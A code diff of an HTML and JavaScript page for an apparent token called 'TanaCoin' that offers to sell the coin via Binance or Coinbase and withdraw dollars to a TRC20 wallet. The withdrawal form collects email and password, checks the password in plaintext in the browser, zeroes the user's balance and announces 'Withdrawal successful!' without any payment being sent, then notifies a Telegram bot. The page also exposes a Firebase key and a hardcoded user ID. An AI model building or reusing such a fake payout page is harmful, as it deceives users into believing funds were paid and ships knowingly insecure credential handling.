@@ -3,231 +3,345 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TanaCoin Exchange</title>
-    
+    <title>Coin Market</title>
+    <link rel="stylesheet" href="style.css">
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #121212;
-            color: #fff;
-            margin: 0;
-            padding: 0;
+    font-family: Arial, sans-serif;
+    background-color: #f4f4f4;
+    margin: 0;
+    padding: 0;
+}
+
+header {
+    background-color: #007bff;
+    color: white;
+    padding: 1rem;
+    text-align: center;
+}
+
+h1 {
+    margin: 0;
+}
+
+main {
+    margin: 20px;
+}
+
+.balance-section, .market-section, .wallet-section {
+    margin: 20px 0;
+}
+
+
+
+button {
+    padding: 10px;
+    background-color: #007bff;
+    color: white;
+    border: none;
+    cursor: pointer;
+    margin-top: 10px; 
+}
+
+.hidden {
+    display: none;
+}
+
+button {
+    padding: 10px;
+    background-color: #007bff;
+    color: white;
+    border: none;
+    cursor: pointer;
+}
+
+button:hover {
+    background-color: #0056b3;
+}
+
+#withdrawal-form {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+    margin-top: 10px;
+}
+
+#withdrawal-message {
+    margin-top: 10px;
+    color: red;
+}
+
+#notification-section {
+    background-color: #d4edda;
+    padding: 10px;
+    border: 1px solid #c3e6cb;
+    color: #155724;
+}
+</style>
+<style>
+
+ .market-section {
             display: flex;
-            justify-content: center;
+            justify-content: space-between;
             align-items: center;
-            height: 100vh;
-            text-shadow: 3px 4px 4px rgba(0, 0, 0, 0.3);        
+            gap: 20px;
         }
 
-        #container {
-            width: 80%;
+        .market-option {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 0; 
+        }
+
+        .market-img {
+            width: 100px; 
+            margin-bottom: 0;
+            Border-radius:10px;
+        }
+
+        .market-option p, .market-option button {
+            margin: 0; 
+        }
+        
+input{
+           padding: 18px;
+            margin-bottom: 20px;
+            border: 1px solid #90ff2b;
+            border-radius: 5px;
+            font-size: 10px;
+            Font-weight:bold;
+       }
+    .wel{
+        
+      font-size: 20px;
+      color: ##ff2b74;
+      text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff, 0 0 30px #00ffff;
+        text-align: center;
+        Color:#70ff40;
+      }
+     .container{
+      width: 80%;
             max-width: 600px;
-            background-color: #1e1e1e;
+            background-image:url("by.png");
+            
             padding: 20px;
             border-radius: 10px;
             box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
             position: relative;
+            Text-align:center;
+            Font-weight:bold;
+            Font-size:30px;
         }
-
-        #main-content {
-            display: block;
-        }
-
-        #convert-btn, #withdrawal-section button {
-            margin-top: 20px;
-            padding: 10px 20px;
-            background-color: #00b894;
-            border: none;
-            color: #fff;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-
-        .hidden {
-            display: none;
-        }
-
-        .exchange-option {
-            display: flex;
-            align-items: center;
-            margin-top: 15px;
-        }
-
-        .exchange-option img {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            margin-right: 10px;
-        }
-
-        .exchange-option button {
-            background-color: #555;
-            padding: 10px;
-            border: none;
-            color: #fff;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-
-        #withdrawal-section {
-            display: block;
-        }
-
-        #dark-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-        }
-
-        #dark-overlay p {
-            font-size: 1.2rem;
-        }
-
-        #back-btn {
-            margin-top: 20px;
-            padding: 10px 20px;
-            background-color: #ff5252;
-            border: none;
-            color: #fff;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-
-        .container9 {
-            width: 80%;
-            max-width: 600px;
-            background-color: #eaffff;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
-            text-align: center;
-            font-weight: bold;
-            font-size: 16px;
-            color: #31ff15;
-        }
+         .notice-container {
+      width: 100%;
+      border-radius: 10px;
+      padding: px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      max-width: 500px;
+      width: 100%;
+      text-align: center;
+    }
+    .notice-container h2 {
+      color: #ff5e5e;
+      margin-bottom: 10px;
+      font-size: 24px;
+    }
+    .notice-container p {
+      color: #333;
+      font-size: 16px;
+      line-height: 1.6;
+    }
+    .notice-container strong {
+      color: #ff5e5e;
+    }
     </style>
 </head>
 <body>
-    <div id="container">
-        <div id="dark-overlay" class="hidden">
-            <p>End <i style="color:red;">🕊️Tana</i><i style="color:green;">Coin</i> Mining: Time is running...</p>
-            <button id="back-btn">✖️ Back</button>
+    <header>
+        <h1 id="welcome-text">Welcome To Sell your <i style="color:red;">🕊️Tana</i><i style="color:green;">Coin</i> Username</h1>
+    </header>
+
+    <main>
+        <section class="balance-section">
+            <p>Your Total <i style="color:red;">🕊️Tana</i><i style="color:green;">Coin</i>: 
+                <span id="userBalance">0.0000</span>
+            </p>
+            <p>Market <i style="color:red;">🕊️Tana</i><i style="color:green;">Coin</i> Price: 
+                $<span id="market-price">0.8648</span> per <i style="color:red;">🕊️Tana</i><i style="color:green;">Coin</i>
+            </p>
+        </section>
+
+        <section class="market-section">
+        <div class="market-option">
+            <img src="b.png" alt="Binance" class="market-img">
+            <p>5.905% fee</p>
+            <button id="binanceBtn" >Sell on Binance</button>
         </div>
+        <div class="market-option">
+            <img src="c.png" alt="Coinbase" class="market-img">
+            <p>6.2979% fee</p>
+            <button id="coinbaseBtn">Sell on Coinbase</button>
+        </div>
+    </section>
 
-        <div id="main-content">
-            <h1>Welcome, <span id="username"></span>!</h1>
-            <p>Your Total <i style="color:red;">🕊️Tana</i><i style="color:green;">Coin</i>: <span id="userBalance">0.0000</span></p>
-            <p>Market <i style="color:red;">🕊️Tana</i><i style="color:green;">Coin</i> Price: $<span id="market-price">1.00</span> per <i style="color:red;">🕊️Tana</i><i style="color:green;">Coin</i></p>
+        <section class="wallet-section">
+            <h2 class="wel"><center>Your Dollars TRC20 WELLET</center></h2>
+  <center class="container">        <p>Balance: $<span id="usdBalance">0.00</span></p></center>
+  
+  <div class="notice-container">
+    <h2>Notice</h2>
+    <p>
+      Before you click <strong>submit</strong>, please ensure you have entered your 
+      <strong>TRC20 wallet address</strong>. You can use a TRC20 wallet from Telegram or any other wallet, 
+      but it must be a TRC20 wallet address only. You will lose your funds if you enter a 
+      different address that is not TRC20.
+    </p>
+  </div>
+            <button id="withdrawBtn"><center>Withdrawal</center></button>
 
-            <h2>Select Exchange:</h2>
-            <div class="exchange-option">
-                <img src="b.png" alt="Binance">
-                <button id="binance-btn">Binance - 5.905% fee</button>
-            </div>
-            <div class="exchange-option">
-                <img src="c.png" alt="Coinbase">
-                <button id="coinbase-btn">Coinbase - 6.7979% fee</button>
-            </div>
-            <div class="exchange-option">
-                <img src="kr.png" alt="Kraken">
-                <button id="kraken-btn">Kraken - 5% fee</button>
-            </div>
-            <div class="exchange-option">
-                <img src="k.png" alt="KuCoin">
-                <button id="kucoin-btn">KuCoin - 6% fee</button>
-            </div>
-
-            <p id="converted-amount"></p>
-
-            <div class="container9">
-                <h1>Wallet</h1>
-                <p>Balance: $<span id="usd-balance">0.00</span></p>
-            </div>
-
-            <div id="withdrawal-section">
-                <h2>Withdrawal</h2>
+            <div id="withdrawal-container" class="hidden">
                 <form id="withdrawal-form">
-                    <label for="wallet">Your Telegram Wallet:</label>
-                  <input type="text" id="wallet" required>
-
-                    <label for="password">Enter your password:</label>
-                    <input type="password" id="password" required>
-
-                    <button type="submit">Withdraw</button>
+                    <input type="number" id="withdrawal-amount" placeholder="Amount $" required>
+                    <input type="text" id="telegram-wallet" placeholder=" Your Telegram Wallet TRC20 Address" required>
+                    <input type="email" id="email" placeholder="Your Email Address" required>
+                    <input type="password" id="password" placeholder="Your Password" required>
+                    <button type="submit">Submit</button>
                 </form>
                 <p id="withdrawal-message"></p>
             </div>
-        </div>
-    </div>    
-    <script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.1.0/firebase-app.js";
-  import { getFirestore, collection, addDoc, doc, getDoc, setDoc, updateDoc } from "https://www.gstatic.com/firebasejs/9.1.0/firebase-firestore.js";
-  import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/9.1.0/firebase-auth.js";
-  
-  const firebaseConfig = {
-    apiKey: "AIzaSyCldVBl...",
+        </section>
+
+        <section id="notification-section" class="hidden">
+            <p id="notification-message">Payment successfully made to your Telegram Wallet!</p>
+        </section>
+    </main>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
+import { getFirestore, doc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";
+
+// Firebase config
+const firebaseConfig = {
+    apiKey: "AIzaSyCldVBlGP7hsERLEa9R30PSYZEOXppYvDs",
     authDomain: "tanacoin-75344.firebaseapp.com",
     projectId: "tanacoin-75344",
     storageBucket: "tanacoin-75344.appspot.com",
     messagingSenderId: "425342256564",
     appId: "1:425342256564:web:b33f74f41e8d7d62659ee1"
-  };
+};
 
-  const app = initializeApp(firebaseConfig);
-  const db = getFirestore(app);
-  const auth = getAuth();
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
 
-  document.addEventListener('DOMContentLoaded', async function () {
-    const usernameEl = document.getElementById('username');
-    const totalTanaCoinEl = document.getElementById('userBalance');
-    const marketPriceEl = document.getElementById('market-price');
-    const usdBalanceEl = document.getElementById('usd-balance');
-    const withdrawalMessageEl = document.getElementById('withdrawal-message');
-    
-    const userCredential = await signInAnonymously(auth);
-    const user = userCredential.user;
+// Specific user ID
+const userId = "ShIKsA9c3xzVpTU16X66";
 
-    const userDoc = doc(db, "User", user.uid);
-    let userData = await getDoc(userDoc);
-    if (!userData.exists()) {
-        userData = {
-            username: "Guest",
-            tanaCoinBalance: 0,
-            password: "12345"
-        };
-        await setDoc(userDoc, userData);
+
+
+// Elements
+const usernameEl = document.getElementById('welcome-text');
+const userBalanceEl = document.getElementById('userBalance');
+const usdBalanceEl = document.getElementById('usdBalance');
+const marketPriceEl = document.getElementById('market-price');
+const withdrawalMessageEl = document.getElementById('withdrawal-message');
+
+// Fetch user data from Firestore
+async function getUserData() {
+    const userDoc = await getDoc(doc(db, "users", userId));
+    if (userDoc.exists()) {
+        const data = userDoc.data();
+        usernameEl.innerHTML = `Welcome To Sell your <i style="color:red;">🕊️Tana</i><i style="color:green;">Coin</i> (${data.username || "Guest"})`;
+        userBalanceEl.innerText = data.tanaCoinBalance ? data.tanaCoinBalance.toFixed(4) : "0.0000";
+        usdBalanceEl.innerText = data.usdBalance ? data.usdBalance.toFixed(2) : "0.00";
     } else {
-        userData = userData.data();
+        alert("User data not found!");
     }
+}
+getUserData();
 
-    usernameEl.textContent = userData.username;
-    totalTanaCoinEl.textContent = userData.tanaCoinBalance.toFixed(4);
-    marketPriceEl.textContent = localStorage.getItem('tanacoinPrice') || 1;
+// Calculate exchange
+function calculateExchange(tanaCoin, feeRate) {
+    const marketPrice = parseFloat(marketPriceEl.innerText);
+    const totalAmount = tanaCoin * marketPrice;
+    const fee = totalAmount * feeRate / 100;
+    return (totalAmount - fee).toFixed(8);
+}
 
-    // Withdrawal logic
-    document.getElementById('withdrawal-form').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        const wallet = document.getElementById('wallet').value;
-        const password = document.getElementById('password').value;
-        
-        if (password === userData.password && userData.tanaCoinBalance > 0) {
-            const withdrawalAmount = userData.tanaCoinBalance * marketPriceEl.textContent;
-            usdBalanceEl.textContent = (parseFloat(usdBalanceEl.textContent) + withdrawalAmount).toFixed(2);
-            
-            withdrawalMessageEl.textContent = `Withdrawal successful! $${withdrawalAmount} sent to ${wallet}`;
-            await updateDoc(userDoc, { tanaCoinBalance: 0 });
-        } else {
-            withdrawalMessageEl.textContent = "Invalid password or insufficient funds.";
+// Binance button click
+document.getElementById('binanceBtn').addEventListener('click', () => {
+    const tanaCoin = parseFloat(userBalanceEl.innerText);
+    const finalAmount = calculateExchange(tanaCoin, 5.905);
+    alert(`You will receive $${finalAmount} after a 5.905% fee.`);
+});
+
+// Coinbase button click
+document.getElementById('coinbaseBtn').addEventListener('click', () => {
+    const tanaCoin = parseFloat(userBalanceEl.innerText);
+    const finalAmount = calculateExchange(tanaCoin, 6.2979);
+    alert(`You will receive $${finalAmount} after a 6.2979% fee.`);
+});
+
+// Handle Withdrawal
+document.getElementById('withdrawBtn').addEventListener('click', () => {
+    document.getElementById('withdrawal-container').classList.toggle('hidden');
+});
+
+// Handle Withdrawal with new validation
+document.getElementById('withdrawal-form').addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const password = document.getElementById('password').value;
+    const withdrawalAmount = parseFloat(document.getElementById('withdrawal-amount').value);
+    const wallet = document.getElementById('telegram-wallet').value;
+
+    const userDoc = await getDoc(doc(db, "users", userId));
+    const userData = userDoc.data();
+
+    // Check password and balance
+    if (password === userData.password && userData.tanaCoinBalance > 0) {
+        const marketPrice = parseFloat(marketPriceEl.textContent);
+        const totalWithdrawal = userData.tanaCoinBalance * marketPrice;
+
+        if (withdrawalAmount > totalWithdrawal) {
+            withdrawalMessageEl.textContent = 'Withdrawal amount exceeds available balance.';
+            return;
         }
-    });
-  });
-  </script>
+
+        usdBalanceEl.textContent = (parseFloat(usdBalanceEl.textContent) + totalWithdrawal).toFixed(2);
+
+        // Display success message
+        withdrawalMessageEl.textContent = `Withdrawal successful! $${totalWithdrawal} sent to TRC20 Wallet Address: ${wallet}`;
+
+        // Update user balance in Firestore
+        await updateDoc(doc(db, "users", userId), {
+            tanaCoinBalance: 0
+        });
+
+        // Send message to Telegram bot
+        const telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN";
+        const chatId = "YOUR_TELEGRAM_CHAT_ID";
+        const message = `Withdrawal alert: $${totalWithdrawal} sent to TRC20 Wallet Address: ${wallet}`;
+
+        // Send withdrawal details to Telegram bot
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log("Message sent to Telegram successfully.");
+                } else {
+                    console.error("Error sending message to Telegram:", data);
+                }
+            }).catch(error => {
+                console.error("Error in Telegram communication:", error);
+            });
+    } else {
+        withdrawalMessageEl.textContent = "Incorrect password or insufficient balance.";
+    }
+});
+</script>
+
+
 </body>
 </html>
